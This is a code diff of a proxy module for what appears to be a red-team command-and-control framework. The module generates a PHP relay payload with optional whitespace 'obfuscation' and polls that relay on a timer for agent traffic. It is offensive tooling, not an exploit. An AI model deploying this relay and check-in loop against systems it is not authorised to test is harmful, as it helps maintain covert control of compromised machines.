@@ -1,18 +1,49 @@
 import axios from "axios";
+import querystring from "querystring";
 import * as fs from "fs";
+import * as crypto from "crypto";
 import { Constants, emsg } from "../utils/utils";
-import BaseModule, { ExecuteReturn } from "./base";
+import BaseModule, { ExecuteReturn, ExecuteCallbackFunction } from "./base";
 import Logger from "../lib/logger";
 import RedChannel from "../lib/redchannel";
 
 const MODULE_DESCRIPTION = "manage the proxy configuration";
+
+const PROXY_PAYLOAD_PATH = "payloads/proxy.php";
+
+export enum ProxyStatus {
+    ERROR_KEY_MISMATCH = "ERR 1",
+    ERROR_KEY_MISSING = "ERR 2",
+    ERROR_INVALID_AGENT_ID = "ERR 3",
+    ERROR_INVALID_DATA_SENT = "ERR 5",
+    ERROR_INVALID_REQUEST = "ERR 6",
+    ERROR_WRITING_TO_AGENT_STORAGE = "ERR 7",
+    ERROR_WRITING_TO_C2_STORAGE = "ERR 8",
+    OK_RECEIVED_FROM_AGENT = "OK PA",
+    OK_RECEIVED_FROM_C2 = "OK PC",
+    OK_NO_DATA = "OK ND",
+}
+
+export type ProxyConfig = {
+    enabled: boolean;
+    url: string;
+    key: string;
+    interval: number;
+    obfuscate_payload: boolean;
+};
 
 export default class ProxyModule extends BaseModule {
     fetchTimer: NodeJS.Timeout | null;
     log: Logger;
     payload: string;
 
-    constructor(protected configFile: string, protected redChannel: RedChannel, protected c2MessageHandler: Function) {
+    constructor(
+        protected configFile: string,
+        protected redChannel: RedChannel,
+        protected c2MessageHandler: Function,
+        protected proxyOnSuccessCallback?: ExecuteCallbackFunction,
+        protected proxyOnErrorCallback?: ExecuteCallbackFunction
+    ) {
         super("proxy", configFile);
         this.log = new Logger();
 
@@ -21,7 +52,14 @@ export default class ProxyModule extends BaseModule {
         this.fetchTimer = null;
         this.payload = "";
 
-        this.config = this.loadConfig();
+        this.config = {
+            enabled: true,
+            key: crypto.randomBytes(6).toString("hex"),
+            interval: 2000,
+            obfuscate_payload: false,
+            url: "http://10.0.5.79/",
+        };
+        this.config = this.loadConfig() as ProxyConfig;
 
         this.defineCommands({
             fetch: {
@@ -33,6 +71,21 @@ export default class ProxyModule extends BaseModule {
                 arguments: [],
                 description: "generate proxy payload with the specified key",
                 execute: this.run,
+            },
+            start: {
+                arguments: [],
+                description: "start the proxy checkin",
+                execute: this.proxyFetchLoop,
+            },
+            stop: {
+                arguments: [],
+                description: "stop the proxy checkin",
+                execute: () => {
+                    if (this.fetchTimer) {
+                        clearTimeout(this.fetchTimer);
+                    }
+                    return { message: "stopping the proxy checkin" };
+                },
             },
             payload: {
                 arguments: [],
@@ -54,6 +107,13 @@ export default class ProxyModule extends BaseModule {
                 description: "enable or disable proxy communication channel",
                 execute: (params: string) => {
                     this.config.enabled = params != "0" && params != "false" ? true : false;
+                },
+            },
+            "set obfuscate_payload": {
+                arguments: ["<1|0>"],
+                description: "enable or disable payload obfuscation",
+                execute: (params: string) => {
+                    this.config.obfuscate_payload = params != "0" && params != "false" ? true : false;
                 },
             },
             "set key": {
@@ -79,18 +139,27 @@ export default class ProxyModule extends BaseModule {
         let data: Buffer;
         let proxyPhp = "";
         try {
-            data = fs.readFileSync("payloads/proxy.php");
+            data = fs.readFileSync(PROXY_PAYLOAD_PATH);
             proxyPhp = data.toString();
         } catch (ex) {
             throw new Error(`failed to generate payload: ${emsg(ex)}`);
         }
 
+        const proxyErrorKeys = Object.keys(ProxyStatus);
+        for (const keyIndex in proxyErrorKeys) {
+            const re = new RegExp(`\\[${proxyErrorKeys[keyIndex]}\\]`, "g");
+            proxyPhp = proxyPhp.replace(re, ProxyStatus[proxyErrorKeys[keyIndex]]);
+        }
         proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.key);
         proxyPhp = proxyPhp.replace(/\/\/.+/g, "");
         proxyPhp = proxyPhp.replace(/<\?php/g, "");
         proxyPhp = proxyPhp.replace(/\?>/g, "");
-        proxyPhp = proxyPhp.replace(/\n/g, "");
-        proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
+
+        // "obfuscation"
+        if (this.config.obfuscate_payload) {
+            proxyPhp = proxyPhp.replace(/\n/g, "");
+            proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
+        }
 
         this.payload = `<?php ${proxyPhp} ?>`;
         return { message: `proxy payload set: \n${this.payload}` };
@@ -108,10 +177,14 @@ export default class ProxyModule extends BaseModule {
         };
 
         try {
-            const res = await axios.post(this.config.url, data);
-            this.log.debug(`proxy send response: ${res.data}`);
+            const res = await axios.post(this.config.url, querystring.stringify(data));
+            const message = `proxy send response: ${res.data}`;
+            if (this.proxyOnSuccessCallback) this.proxyOnSuccessCallback({ message: message });
+            else this.log.debug(message);
         } catch (ex) {
-            this.log.error(`failed to send data to proxy: ${emsg(ex)}`);
+            const message = `proxy send failed: ${emsg(ex)}`;
+            if (this.proxyOnErrorCallback) this.proxyOnErrorCallback({ message: message });
+            else this.log.error(message);
         }
         return;
     }
@@ -132,26 +205,35 @@ export default class ProxyModule extends BaseModule {
         }
 
         const data = {
-            url: this.config.url,
-            form: {
-                k: this.config.key,
-                f: "a",
-            },
+            k: this.config.key,
+            f: "a",
         };
 
         return axios
-            .post(this.config.url, data)
+            .post(this.config.url, querystring.stringify(data))
             .then((result) => this.processProxyData(result.data))
             .catch((ex) => {
-                this.log.error(`proxy fetch failed: ${emsg(ex)}`);
+                const message = `proxy fetch failed: ${emsg(ex)}`;
+                if (this.proxyOnErrorCallback) this.proxyOnErrorCallback({ message: message });
+                else this.log.error(message);
             });
     }
 
     processProxyData(proxyData: string) {
         // we expect the proxy to respond with ERR 1, or similar
-        // this.this.log.debug(`proxy response:\n${proxyData}`);
-        if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
-        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);
+        // this.log.debug(`proxy response:\n${proxyData}`);
+        if (proxyData.length < 2) throw new Error(`unexpected response (too small): '${proxyData}'`);
+
+        // everything was ok, but no data from agents in proxy storage
+        if (proxyData === ProxyStatus.OK_NO_DATA) return;
+
+        if (!Constants.VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data: '${proxyData}'`);
+
+        // a known error was throw
+        if (Object.values(ProxyStatus).includes(proxyData as ProxyStatus)) {
+            const codeName = Object.keys(ProxyStatus)[Object.values(ProxyStatus).indexOf(proxyData as ProxyStatus)];
+            throw new Error(`proxy returned code ${codeName}`);
+        }
 
         // grab proxy response and build mock dns queries
         let data = proxyData.replace(/;$/, "").split(";");
@@ -188,17 +270,15 @@ export default class ProxyModule extends BaseModule {
         return { message: message };
     }
 
-    proxyFetchLoop() {
+    proxyFetchLoop(): ExecuteReturn {
         if (this.fetchTimer) clearTimeout(this.fetchTimer);
-        if (!this.config.enabled) return;
+        if (!this.config.enabled) return { message: "proxy is not enabled" };
 
         if (!this.config.url) {
-            this.log.error(`proxy config is missing the url: see 'help'`);
-            return;
+            throw new Error(`proxy config is missing the url: see 'help'`);
         }
         if (!this.config.key) {
-            this.log.error(`proxy config is missing a key: see 'help'`);
-            return;
+            throw new Error(`proxy config is missing a key: see 'help'`);
         }
 
         this.getFromProxy()?.finally(() => {
@@ -206,5 +286,7 @@ export default class ProxyModule extends BaseModule {
                 this.proxyFetchLoop();
             }, this.config.interval);
         });
+
+        return { message: "starting the proxy checkin loop" };
     }
 }
